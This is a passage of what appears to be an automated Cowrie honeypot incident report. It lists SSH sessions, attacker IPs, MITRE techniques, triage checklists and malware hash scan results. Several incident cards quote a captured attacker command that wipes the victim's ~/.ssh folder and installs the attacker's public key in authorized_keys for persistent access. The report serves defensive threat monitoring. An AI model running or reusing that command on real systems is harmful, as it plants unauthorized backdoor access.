- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d767c669f0a7

| Field | Detail |
|---|---|
| **Source IP** | `103.143.238[.]100` |
| **First Seen** | 2026-05-21 09:47 |
| **Last Seen** | 2026-05-21 09:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:47:07` | `cowrie.session.connect` |
| `2026-05-21 09:47:07` | `cowrie.client.version` |
| `2026-05-21 09:47:07` | `cowrie.client.kex` |
| `2026-05-21 09:47:08` | `cowrie.login.success` |
| `2026-05-21 09:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.238[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.143.238[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1329dc816fb2

| Field | Detail |
|---|---|
| **Source IP** | `103.143.238[.]100` |
| **First Seen** | 2026-05-21 09:47 |
| **Last Seen** | 2026-05-21 09:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:47:13` | `cowrie.session.connect` |
| `2026-05-21 09:47:13` | `cowrie.client.version` |
| `2026-05-21 09:47:13` | `cowrie.client.kex` |
| `2026-05-21 09:47:14` | `cowrie.login.success` |
| `2026-05-21 09:47:15` | `cowrie.session.params` |
| `2026-05-21 09:47:15` | `cowrie.command.input` |
| `2026-05-21 09:47:15` | `cowrie.command.failed` |
| `2026-05-21 09:47:15` | `cowrie.log.closed` |
| `2026-05-21 09:47:15` | `cowrie.session.params` |
| `2026-05-21 09:47:15` | `cowrie.command.input` |
| `2026-05-21 09:47:16` | `cowrie.session.file_download` |
| `2026-05-21 09:47:16` | `cowrie.log.closed` |
| `2026-05-21 09:47:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.238[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.143.238[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b804a7cdb58

| Field | Detail |
|---|---|
| **Source IP** | `102.211.152[.]138` |
| **First Seen** | 2026-05-21 09:47 |
| **Last Seen** | 2026-05-21 09:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:47:13` | `cowrie.session.connect` |
| `2026-05-21 09:47:13` | `cowrie.client.version` |
| `2026-05-21 09:47:13` | `cowrie.client.kex` |
| `2026-05-21 09:47:14` | `cowrie.login.success` |
| `2026-05-21 09:47:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.211.152[.]138` to AbuseIPDB if not already reported
- [ ] Block `102.211.152[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9af29f3c3fe

| Field | Detail |
|---|---|
| **Source IP** | `103.143.238[.]100` |
| **First Seen** | 2026-05-21 09:47 |
| **Last Seen** | 2026-05-21 09:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:47:19` | `cowrie.session.connect` |
| `2026-05-21 09:47:19` | `cowrie.client.version` |
| `2026-05-21 09:47:19` | `cowrie.client.kex` |
| `2026-05-21 09:47:20` | `cowrie.login.success` |
| `2026-05-21 09:47:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.238[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.143.238[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b18317cdafd

| Field | Detail |
|---|---|
| **Source IP** | `103.143.238[.]100` |
| **First Seen** | 2026-05-21 09:47 |
| **Last Seen** | 2026-05-21 09:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:47:49` | `cowrie.session.connect` |
| `2026-05-21 09:47:49` | `cowrie.client.version` |
| `2026-05-21 09:47:49` | `cowrie.client.kex` |
| `2026-05-21 09:47:50` | `cowrie.login.success` |
| `2026-05-21 09:47:51` | `cowrie.session.params` |
| `2026-05-21 09:47:51` | `cowrie.command.input` |
| `2026-05-21 09:47:51` | `cowrie.command.failed` |
| `2026-05-21 09:47:51` | `cowrie.log.closed` |
| `2026-05-21 09:47:52` | `cowrie.session.params` |
| `2026-05-21 09:47:52` | `cowrie.command.input` |
| `2026-05-21 09:47:52` | `cowrie.session.file_download` |
| `2026-05-21 09:47:52` | `cowrie.log.closed` |
| `2026-05-21 09:47:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.238[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.143.238[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f4a0b7806fb

| Field | Detail |
|---|---|
| **Source IP** | `103.143.238[.]100` |
| **First Seen** | 2026-05-21 09:47 |
| **Last Seen** | 2026-05-21 09:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:47:55` | `cowrie.session.connect` |
| `2026-05-21 09:47:55` | `cowrie.client.version` |
| `2026-05-21 09:47:55` | `cowrie.client.kex` |
| `2026-05-21 09:47:56` | `cowrie.login.success` |
| `2026-05-21 09:47:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.238[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.143.238[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0521c38d3e97

| Field | Detail |
|---|---|
| **Source IP** | `103.143.238[.]100` |
| **First Seen** | 2026-05-21 09:48 |
| **Last Seen** | 2026-05-21 09:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:48:19` | `cowrie.session.connect` |
| `2026-05-21 09:48:19` | `cowrie.client.version` |
| `2026-05-21 09:48:20` | `cowrie.client.kex` |
| `2026-05-21 09:48:21` | `cowrie.login.success` |
| `2026-05-21 09:48:21` | `cowrie.session.params` |
| `2026-05-21 09:48:21` | `cowrie.command.input` |
| `2026-05-21 09:48:21` | `cowrie.command.failed` |
| `2026-05-21 09:48:22` | `cowrie.log.closed` |
| `2026-05-21 09:48:22` | `cowrie.session.params` |
| `2026-05-21 09:48:22` | `cowrie.command.input` |
| `2026-05-21 09:48:22` | `cowrie.session.file_download` |
| `2026-05-21 09:48:22` | `cowrie.log.closed` |
| `2026-05-21 09:48:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.238[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.143.238[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c716fc993c75

| Field | Detail |
|---|---|
| **Source IP** | `103.143.238[.]100` |
| **First Seen** | 2026-05-21 09:48 |
| **Last Seen** | 2026-05-21 09:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:48:25` | `cowrie.session.connect` |
| `2026-05-21 09:48:25` | `cowrie.client.version` |
| `2026-05-21 09:48:26` | `cowrie.client.kex` |
| `2026-05-21 09:48:27` | `cowrie.login.success` |
| `2026-05-21 09:48:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.238[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.143.238[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9c0fd5596d7

| Field | Detail |
|---|---|
| **Source IP** | `103.143.238[.]100` |
| **First Seen** | 2026-05-21 09:48 |
| **Last Seen** | 2026-05-21 09:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:48:35` | `cowrie.session.connect` |
| `2026-05-21 09:48:35` | `cowrie.client.version` |
| `2026-05-21 09:48:36` | `cowrie.client.kex` |
| `2026-05-21 09:48:37` | `cowrie.login.success` |
| `2026-05-21 09:48:37` | `cowrie.session.params` |
| `2026-05-21 09:48:37` | `cowrie.command.input` |
| `2026-05-21 09:48:37` | `cowrie.command.failed` |
| `2026-05-21 09:48:38` | `cowrie.log.closed` |
| `2026-05-21 09:48:38` | `cowrie.session.params` |
| `2026-05-21 09:48:38` | `cowrie.command.input` |
| `2026-05-21 09:48:38` | `cowrie.session.file_download` |
| `2026-05-21 09:48:38` | `cowrie.log.closed` |
| `2026-05-21 09:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.238[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.143.238[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1356a7149838

| Field | Detail |
|---|---|
| **Source IP** | `103.143.238[.]100` |
| **First Seen** | 2026-05-21 09:48 |
| **Last Seen** | 2026-05-21 09:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:48:41` | `cowrie.session.connect` |
| `2026-05-21 09:48:41` | `cowrie.client.version` |
| `2026-05-21 09:48:41` | `cowrie.client.kex` |
| `2026-05-21 09:48:42` | `cowrie.login.success` |
| `2026-05-21 09:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.238[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.143.238[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e9f4b4af1a1

| Field | Detail |
|---|---|
| **Source IP** | `103.143.238[.]100` |
| **First Seen** | 2026-05-21 09:48 |
| **Last Seen** | 2026-05-21 09:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 09:48:48` | `cowrie.session.connect` |
| `2026-05-21 09:48:48` | `cowrie.client.version` |
| `2026-05-21 09:48:48` | `cowrie.client.kex` |
| `2026-05-21 09:48:49` | `cowrie.login.success` |
| `2026-05-21 09:48:50` | `cowrie.session.params` |
| `2026-05-21 09:48:50` | `cowrie.command.input` |
| `2026-05-21 09:48:50` | `cowrie.command.failed` |
| `2026-05-21 09:48:51` | `cowrie.log.closed` |
| `2026-05-21 09:48:51` | `cowrie.session.params` |
| `2026-05-21 09:48:51` | `cowrie.command.input` |
| `2026-05-21 09:48:51` | `cowrie.session.file_download` |
| `2026-05-21 09:48:51` | `cowrie.log.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.238[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.143.238[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `157.245.56[.]194` | **135** | 2026-05-21 04:03 | 2026-05-21 09:12 | 81m | 0 | `T1592` | 🟠 MEDIUM |
| `143.244.170[.]161` | **46** | 2026-05-21 04:26 | 2026-05-21 09:46 | 49m | 0 | `T1592` | 🟠 MEDIUM |
| `130.211.76[.]129` | **33** | 2026-05-21 06:24 | 2026-05-21 06:24 | 5m | 4 | `T1110.001` | 🟠 MEDIUM |
| `34.140.39[.]231` | **33** | 2026-05-21 08:04 | 2026-05-21 08:05 | 3m | 4 | `T1110.001` | 🟠 MEDIUM |
| `35.187.54[.]189` | **33** | 2026-05-21 07:06 | 2026-05-21 07:07 | 5m | 4 | `T1110.001` | 🟠 MEDIUM |
| `72.255.32[.]122` | **25** | 2026-05-21 07:23 | 2026-05-21 07:28 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `103.143.238[.]100` | **18** | 2026-05-21 09:44 | 2026-05-21 09:48 | 0m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `72.255.3[.]67` | **12** | 2026-05-21 06:55 | 2026-05-21 06:57 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `45.148.120[.]187` | **9** | 2026-05-21 05:20 | 2026-05-21 07:35 | 10m | 0 | `T1592` | 🟢 LOW |
| `194.102.73[.]93` | **3** | 2026-05-21 04:26 | 2026-05-21 05:11 | 1m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]83` | **3** | 2026-05-21 07:40 | 2026-05-21 07:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.83.49[.]78` | **2** | 2026-05-21 09:40 | 2026-05-21 09:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `40.82.214[.]8` | **2** | 2026-05-21 04:03 | 2026-05-21 04:05 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `48.217.233[.]215` | **2** | 2026-05-21 08:14 | 2026-05-21 08:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.230.144[.]128` | 1 | 2026-05-21 05:15 | 2026-05-21 05:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `102.211.152[.]138` | 1 | 2026-05-21 09:47 | 2026-05-21 09:47 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.88.137[.]80` | 1 | 2026-05-21 09:45 | 2026-05-21 09:45 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.116.245[.]48` | 1 | 2026-05-21 06:32 | 2026-05-21 06:32 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.190.119[.]177` | 1 | 2026-05-21 05:13 | 2026-05-21 05:13 | 8s | 0 | `T1592` | 🟢 LOW |
| `120.48.112[.]118` | 1 | 2026-05-21 09:48 | 2026-05-21 09:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `121.161.149[.]104` | 1 | 2026-05-21 07:26 | 2026-05-21 07:26 | 13s | 0 | `T1592` | 🟢 LOW |
| `154.126.169[.]204` | 1 | 2026-05-21 09:02 | 2026-05-21 09:02 | 13s | 0 | `T1592` | 🟢 LOW |
| `16.58.56[.]214` | 1 | 2026-05-21 06:11 | 2026-05-21 06:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.102.73[.]93` | 1 | 2026-05-21 09:45 | 2026-05-21 09:46 | 44s | 0 | `T1592` | 🟢 LOW |
| `207.180.229[.]239` | 1 | 2026-05-21 09:46 | 2026-05-21 09:46 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `210.14.142[.]89` | 1 | 2026-05-21 06:27 | 2026-05-21 06:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `222.107.254[.]97` | 1 | 2026-05-21 06:26 | 2026-05-21 06:26 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `41.216.178[.]69` | 1 | 2026-05-21 09:47 | 2026-05-21 09:47 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.75.95[.]205` | 1 | 2026-05-21 06:00 | 2026-05-21 06:00 | 12s | 0 | `T1592` | 🟢 LOW |
| `5.182.83[.]231` | 1 | 2026-05-21 09:47 | 2026-05-21 09:47 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `5.20.124[.]130` | 1 | 2026-05-21 08:56 | 2026-05-21 08:56 | 13s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]192` | 1 | 2026-05-21 09:36 | 2026-05-21 09:36 | 15s | 0 | `T1592` | 🟢 LOW |
| `79.36.191[.]212` | 1 | 2026-05-21 09:47 | 2026-05-21 09:47 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.101.54[.]97` | 1 | 2026-05-21 06:49 | 2026-05-21 06:49 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `72.255.32[.]122` | PK | Cyber Internet Services Pakistan | **100** ⚠️ | 1 |
| `35.187.54[.]189` | BE | Google LLC | **100** ⚠️ | 1 |
